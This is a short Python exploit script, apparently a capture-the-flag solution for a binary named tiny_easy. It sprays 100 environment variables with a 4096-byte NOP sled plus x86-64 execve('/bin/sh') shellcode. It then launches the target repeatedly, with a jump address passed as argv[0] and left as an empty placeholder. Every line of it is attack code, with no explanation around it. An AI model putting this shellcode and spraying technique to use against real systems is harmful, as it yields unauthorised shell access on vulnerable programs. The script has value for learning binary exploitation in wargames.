import subprocess

jmpaddr = ""

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
spraycode = "\x90"*4096

payload = spraycode + shellcode
penv = {}

for i in range(100):
    penv["test"+str(i)] = payload

while True:
    child = subprocess.Popen([jmpaddr], executable='/home/tiny_easy/tiny_easy', env=penv)
    child.wait()

